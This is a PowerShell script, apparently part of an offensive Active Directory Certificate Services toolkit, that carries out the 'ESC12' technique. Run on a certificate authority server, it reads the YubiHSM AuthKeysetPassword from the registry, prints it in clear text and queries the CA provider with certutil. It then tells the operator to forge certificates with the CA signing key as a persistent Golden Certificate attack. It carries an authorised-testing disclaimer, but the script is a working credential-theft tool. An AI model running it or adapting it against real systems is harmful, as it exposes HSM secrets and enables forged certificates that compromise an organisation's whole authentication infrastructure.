<#
.SYNOPSIS
    AD CS ESC12 - YubiHSM Key Recovery (LOLBAS).
.DESCRIPTION
    Checks for YubiHSM AuthKeysetPassword in the registry on the CA server.
    If the CA private key is stored in a YubiHSM and the password is in the
    registry, the CA signing key can be recovered for Golden Certificate attacks.
    Must be run on the CA server itself.
.EXAMPLE
    .\Invoke-ESC12.ps1
.NOTES
    For authorised security testing and educational purposes only.
#>

[CmdletBinding()]
param()

$ErrorActionPreference = 'Stop'

$_dir = if ($PSScriptRoot) { $PSScriptRoot } else { Split-Path -Parent $MyInvocation.MyCommand.Definition }
. "$_dir\adcs-common.ps1"

Write-Host ""
Write-Host "  AD CS LOLBAS - ESC12 Standalone" -ForegroundColor White
Write-Host "  ---------------------------------" -ForegroundColor DarkGray
Write-Host ""

Write-Banner "ESC12" "YubiHSM Key Recovery"

Write-Stage -Number 1 -Name "HSM CREDENTIAL DISCOVERY"

$regPath = "HKLM:\SOFTWARE\Yubico\YubiHSM"
if (Test-Path $regPath) {
    try {
        $password = (Get-ItemProperty -Path $regPath -Name 'AuthKeysetPassword' -ErrorAction Stop).AuthKeysetPassword
        Write-Host "    [!] YubiHSM AuthKeysetPassword: $password" -ForegroundColor Red
        Write-Host "    [!] CA private key accessible via HSM with this credential" -ForegroundColor Red
    } catch {
        Write-Host "    [-] Registry path exists but AuthKeysetPassword not found" -ForegroundColor Gray
    }
} else {
    Write-Host "    [-] YubiHSM registry path not found" -ForegroundColor Gray
}

Write-Host ""
Write-Host "    [>] CA Cryptographic Provider:" -ForegroundColor Gray
certutil -getreg CA\CSP\Provider 2>$null | ForEach-Object { Write-Host "        $_" -ForegroundColor Gray }

Write-Stage -Number 1 -Name "HSM CREDENTIAL DISCOVERY" -Status 'COMPLETE'

Write-Host ""
Write-Host "    [i] With the HSM password, forge certificates using the CA's signing key" -ForegroundColor Cyan
Write-Host "    [i] This is a Golden Certificate attack - persists until CA key rotation" -ForegroundColor Cyan
Write-Host ""
